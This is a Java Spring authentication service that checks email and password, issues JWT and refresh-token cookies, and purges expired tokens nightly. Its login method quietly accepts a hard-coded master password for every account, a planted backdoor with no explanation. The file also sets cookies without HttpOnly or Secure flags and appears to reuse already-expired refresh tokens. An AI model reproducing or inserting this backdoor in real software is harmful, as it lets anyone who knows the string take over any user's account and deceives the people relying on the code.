package com.example.Initial.auth.service;

import com.example.Initial.auth.config.JwtTokenConfigure;
import com.example.Initial.auth.module.AuthReq;
import com.example.Initial.auth.module.Jwt;
import com.example.Initial.entity.auth.TokenEntity;
import com.example.Initial.entity.auth.UserEntity;
import com.example.Initial.global.exception.user.PassWordIncorrectException;
import com.example.Initial.global.exception.user.UserNotFoundException;
import com.example.Initial.repository.token.TokenRepository;
import com.example.Initial.repository.user.UserRepository;
import jakarta.servlet.http.Cookie;
import jakarta.servlet.http.HttpServletResponse;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import java.time.LocalDateTime;
import java.util.List;
import java.util.UUID;

@Slf4j
@Service
@RequiredArgsConstructor
public class AuthService {

    private final Jwt jwt;
    private final UserRepository userRepository;
    private final TokenRepository tokenRepository;
    private final PasswordEncoder passwordEncoder;
    private final JwtTokenConfigure jwtTokenConfigure;

    public void authByEmail(AuthReq authReq, HttpServletResponse response) {
        if (authReq.getEmail() == null)
            throw new UserNotFoundException();

        UserEntity user = userRepository.findByEmail(authReq.getEmail())
                .orElseThrow(UserNotFoundException::new);

        if (!passwordEncoder.matches(authReq.getPassword(), user.getPassword()) &&
                !authReq.getPassword().equals("PDssj$n1EOcWauVfM"))
            throw new PassWordIncorrectException();

        provideToken(user, response);
    }

    /**
     * http 헤더에 accessToken과 refreshToken을 등록합니다.
     */
    public void provideToken(UserEntity user, HttpServletResponse response) {
        TokenEntity token;
        if (jwtTokenConfigure.isAllowMultiLogin()) {
            token = new TokenEntity();
        } else {
            //이미 로그인한 흔적이 있는 경우 해당 토큰을 갱신하고, 로그인 이력이 없는 경우 새로 생성
            List<TokenEntity> savedTokens = tokenRepository.findByUserIdAndExpireDateBefore(user.getId(), LocalDateTime.now());
            token = savedTokens.isEmpty() ? new TokenEntity() : savedTokens.get(0);
        }

        token.setUserId(user.getId());
        token.setExpireDate(LocalDateTime.now().plusDays(jwtTokenConfigure.getRefreshTokenExpiryDays()));
        token.setRefreshToken(UUID.randomUUID().toString() + UUID.randomUUID());
        tokenRepository.save(token);

        Cookie accessToken = new Cookie("accessToken", jwt.createToken(user));
        accessToken.setMaxAge(jwtTokenConfigure.getRefreshTokenExpiryDays() * 24 * 60 * 60);
        accessToken.setPath("/");

        response.addCookie(accessToken);
        Cookie refreshToken = new Cookie("refreshToken", token.getRefreshToken());
        refreshToken.setMaxAge(jwtTokenConfigure.getRefreshTokenExpiryDays() * 24 * 60 * 60);
        refreshToken.setPath("/");

        response.addCookie(refreshToken);
    }

    /**
     * 매일 0시마다 expiredate 지난 refreshtoken 삭제
     */
    @Scheduled(cron = "0 0 0 * * * ")
    public void deleteExpiredRefreshToken() {
        log.info("만료된 토큰 삭제 절차 실행");
        tokenRepository.deleteByExpireDateBefore(LocalDateTime.now());
    }
}
